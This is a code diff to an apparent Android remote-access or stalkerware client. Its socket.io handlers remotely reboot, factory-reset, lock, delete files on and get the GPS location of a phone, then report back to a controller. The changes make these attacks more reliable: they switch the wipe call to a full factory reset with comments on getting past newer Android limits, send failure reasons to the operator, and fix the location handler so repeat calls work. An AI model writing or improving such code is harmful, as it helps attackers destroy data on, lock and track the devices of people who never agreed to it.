@@ -146,21 +146,28 @@ public class ConnectionManager {
     private static void x0000rebootDevice() throws JSONException {
         JSONObject jsonObject = new JSONObject();
 
-        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
+        try {
+            if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                MainActivity.devicePolicyManager.reboot(MainActivity.componentName);
-                jsonObject.put("status", true);
-                jsonObject.put("message", "Device rebooted successfully.");
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                    MainActivity.devicePolicyManager.reboot(MainActivity.componentName);
+                    jsonObject.put("status", true);
+                    jsonObject.put("message", "Device rebooted successfully.");
+                }
+                else{
+                    jsonObject.put("status", false);
+                    jsonObject.put("message", "Device is below Android 7.0");
+                }
             }
             else{
                 jsonObject.put("status", false);
-                jsonObject.put("message", "Device is below Android 7.0");
+                jsonObject.put("message", "Device admin permission is not active.");
             }
-        }
-        else{
+        } catch (Exception e) {
+            // reboot() requires device-owner powers on Android 7+; never fail
+            // silently -- report the exact reason instead.
             jsonObject.put("status", false);
-            jsonObject.put("message", "Device admin permission is not active.");
+            jsonObject.put("message", "reboot failed: " + e.getMessage());
         }
         ioSocket.emit("x0000rebootDevice", jsonObject);
     }
@@ -169,30 +176,45 @@ public class ConnectionManager {
 
         JSONObject jsonObject = new JSONObject();
 
-        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
-            MainActivity.devicePolicyManager.wipeData(1);
-            jsonObject.put("status", true);
-            jsonObject.put("message", "Device wiped out successfully.");
-        }
-        else{
+        try {
+            if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
+                // flags=0 performs a full factory reset (the WIPE_EXTERNAL_STORAGE
+                // flag can hit the "system user cannot be removed" path on newer
+                // Android when the device has no separate work profile).
+                MainActivity.devicePolicyManager.wipeData(0);
+                jsonObject.put("status", true);
+                jsonObject.put("message", "Device wiped out successfully.");
+            }
+            else{
+                jsonObject.put("status", false);
+                jsonObject.put("message", "Device admin permission is not active.");
+            }
+        } catch (Exception e) {
+            // wipeData() can be refused (e.g. a no_factory_reset restriction
+            // set by the OS / provisioning); never fail silently.
             jsonObject.put("status", false);
-            jsonObject.put("message", "Device admin permission is not active.");
+            jsonObject.put("message", "wipe failed: " + e.getMessage());
         }
-        ioSocket.emit("x0000lockDevice", jsonObject);
+        ioSocket.emit("x0000wipeDevice", jsonObject);
     }
 
     private static void x0000lockDevice() throws JSONException {
 
         JSONObject jsonObject = new JSONObject();
 
-        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
-            MainActivity.devicePolicyManager.lockNow();
-            jsonObject.put("status", true);
-            jsonObject.put("message", "Device locked.");
-        }
-        else{
+        try {
+            if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
+                MainActivity.devicePolicyManager.lockNow();
+                jsonObject.put("status", true);
+                jsonObject.put("message", "Device locked.");
+            }
+            else{
+                jsonObject.put("status", false);
+                jsonObject.put("message", "Device admin permission is not active.");
+            }
+        } catch (Exception e) {
             jsonObject.put("status", false);
-            jsonObject.put("message", "Device admin permission is not active.");
+            jsonObject.put("message", "lock failed: " + e.getMessage());
         }
         ioSocket.emit("x0000lockDevice", jsonObject);
     }
@@ -235,6 +257,10 @@ public class ConnectionManager {
         }
         else if (file.isFile() && file.exists()){
             jsonObject.put("status", file.delete());
+        }
+        else{
+            jsonObject.put("status", false);
+            jsonObject.put("message", "File/folder does not exist.");
         }
 
         ioSocket.emit("x0000deleteFF", jsonObject);
@@ -350,7 +376,11 @@ public class ConnectionManager {
     }
 
     public static void x0000lm() throws Exception {
-        Looper.prepare();
+        // The socket.io callback thread may already have a Looper from a
+        // previous call (Looper.prepare() throws otherwise).
+        if (Looper.myLooper() == null) {
+            Looper.prepare();
+        }
         LocManager gps = new LocManager(context);
         JSONObject location = new JSONObject();
         // check if GPS enabled
